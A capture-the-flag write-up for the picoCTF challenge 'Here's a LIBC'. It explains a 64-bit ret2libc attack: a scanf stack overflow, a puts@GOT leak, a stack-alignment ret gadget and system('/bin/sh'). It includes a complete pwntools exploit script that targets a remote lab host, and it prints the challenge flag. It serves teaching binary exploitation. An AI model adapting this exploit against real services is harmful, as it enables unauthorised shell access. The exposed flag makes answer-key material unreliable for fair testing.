# Here's a LIBC — 64-bit Ret2libc & GOT Leak

**Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
**Category:** Binary Exploitation (Pwn)  
**Difficulty:** Medium (CyLab 3)  
**Tools:** `file`, `checksec`, GDB with `pwndbg`, `ROPgadget`, `pwntools`, Python 3  
**Binary:** 64-bit ELF (`vuln`) paired with `libc.so.6` (Ubuntu GLIBC 2.27-3ubuntu1.2)  

---

## TL;DR

An essential rite of passage for any binary exploitation student: **64-bit ret2libc**. The binary exposes an unbounded stack buffer overflow via `scanf("%[^\n]", buf)`. Because NX is enabled and the binary is non-PIE, we construct a two-stage ROP chain: Stage 1 uses `puts@plt` to leak the resolved runtime address of `puts@GOT` and loops back into `do_stuff()`; Stage 2 computes the base address of the provided `libc.so.6`, aligns the stack (to satisfy x86-64 SSE 16-byte alignment requirements), and invokes `system("/bin/sh")`.

---

## Student's Learning Note: x86-64 ROP Fundamentals

Coming from 32-bit exploitation where arguments are simply pushed onto the stack, transitioning to x86-64 introduced two critical concepts:

1. **System V AMD64 Calling Convention:** The first argument is passed in `rdi` (not on the stack). Thus, calling `puts(GOT_PUTS)` requires a `pop rdi ; ret` gadget.
2. **The 16-byte Stack Alignment Requirement:** The x86-64 ABI (and glibc implementation of `system()` / `do_system()`) relies on SSE instructions like `movaps` which require `rsp` to be 16-byte aligned before calling functions. If the stack is misaligned by 8 bytes upon entering `system()`, the process terminates with a `SIGSEGV`. Inserting an extra `ret` gadget realigns the stack.

---

## Reconnaissance

Analyzing the target binary and mitigations:

```bash
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
$ checksec --file=vuln
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000 base)
RUNPATH:  ./
```

Observations:
* **No PIE:** Code section and PLT/GOT entries are fixed at `0x400000`.
* **No Canary:** Stack can be overwritten beyond the saved frame pointer.
* **NX Enabled:** Direct shellcode injection on the stack is prevented.
* **Target Libc:** Ubuntu GLIBC 2.27-3ubuntu1.2.

---

## Vulnerability Analysis

In `do_stuff()`:
```c
char buf[128]; // [rbp - 0x80]
scanf("%[^\n]", buf);
```

- `scanf("%[^\n]", buf)` reads characters until a newline is encountered without checking the destination buffer size.
- Offset calculation: Buffer starts at `[rbp - 0x80]`. The return address is at `[rbp + 0x8]`.
  $$\text{Offset} = 0x80 + 0x8 = 128 + 8 = 136 \text{ bytes}$$
- The function runs a loop that toggles casing on `buf[0..99]`. Because `136 > 100`, our ROP chain situated at offset 136 remains completely untampered.

---

## Exploitation Plan

### Stage 1: Leaking Libc Address
We use `ROPgadget` to find a `pop rdi ; ret` gadget in the binary:
* `pop rdi ; ret` = `0x400913`
* `puts@plt` = `0x400540`
* `puts@got` = `0x601018`
* `do_stuff` = `0x4006d8`

Payload 1:
```text
[ 136 bytes of padding ]
+ [ pop_rdi ]
+ [ puts@got ]
+ [ puts@plt ]
+ [ do_stuff ]  <-- Re-enters function to accept Stage 2 payload!
```

After Stage 1 executes, `puts` prints the runtime address of `puts` in libc. We calculate:
$$\text{libc\_base} = \text{puts\_leak} - 0x80a30$$
$$\text{system} = \text{libc\_base} + 0x4f4e0$$
$$\text{/bin/sh} = \text{libc\_base} + 0x1b40fa$$

### Stage 2: Spawning Shell with Stack Alignment
To prevent `system()` crashing on `movaps`, we insert a standalone `ret` (`0x40052e`) gadget:

Payload 2:
```text
[ 136 bytes of padding ]
+ [ ret ]       <-- 8-byte stack alignment fix
+ [ pop_rdi ]
+ [ binsh_addr ]
+ [ system_addr ]
```

---

## Debugging Hurdle: Local Dynamic Linker Incompatibility

When testing locally on Arch Linux (running glibc 2.39+), executing the binary with the provided glibc 2.27 failed immediately due to runtime linker incompatibility (`_dl_call_libc_early_init Assertion`).

**Solution:**  
Rather than relying on `LD_PRELOAD`, explicitly invoke the matched dynamic linker:
```bash
./ld-2.27.so --library-path . ./vuln
```
This allowed full local debugging fidelity with GDB before connecting to the remote instance.

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

HOST = "xebec.cylabacademy.net"
PORT = 48281

POP_RDI  = 0x400913
RET      = 0x40052e
PUTS_PLT = 0x400540
GOT_PUTS = 0x601018
DO_STUFF = 0x4006d8
OFF      = 136

PUTS_OFF   = 0x80a30
SYSTEM_OFF = 0x4f4e0
BINSH_OFF  = 0x1b40fa

def main():
    p = remote(HOST, PORT)
    p.recvuntil(b'sErVeR!\n', timeout=5)

    # Stage 1: Leak puts libc address
    payload1 = b'A' * OFF + p64(POP_RDI) + p64(GOT_PUTS) + p64(PUTS_PLT) + p64(DO_STUFF)
    p.sendline(payload1)
    p.recvuntil(b'\n')  # Discard echo line
    
    leak = p.recvline().strip()
    puts_leak = u64(leak.ljust(8, b'\x00'))
    libc_base = puts_leak - PUTS_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr = libc_base + BINSH_OFF

    log.success(f"Libc Base: {hex(libc_base)}")

    # Stage 2: Return-to-system with stack alignment
    payload2 = b'A' * OFF + p64(RET) + p64(POP_RDI) + p64(binsh_addr) + p64(system_addr)
    p.sendline(payload2)
    p.interactive()

if __name__ == '__main__':
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag & Key Takeaways

```text
academy{1_l0v3_sm4sh_st4cking_831253496d43781d}
```

1. **x86-64 Calling Convention:** Always verify argument placement (`rdi`, `rsi`, `rdx`...) when moving from 32-bit to 64-bit architectures.
2. **Stack Alignment:** If an x86-64 ROP chain segfaults inside `system()` or `do_system()`, prepend a dummy `ret` gadget to restore 16-byte alignment.
3. **Loopback Chaining:** Restarting `main()` or the vulnerable function enables arbitrary multi-stage ROP without needing multiple remote connections.
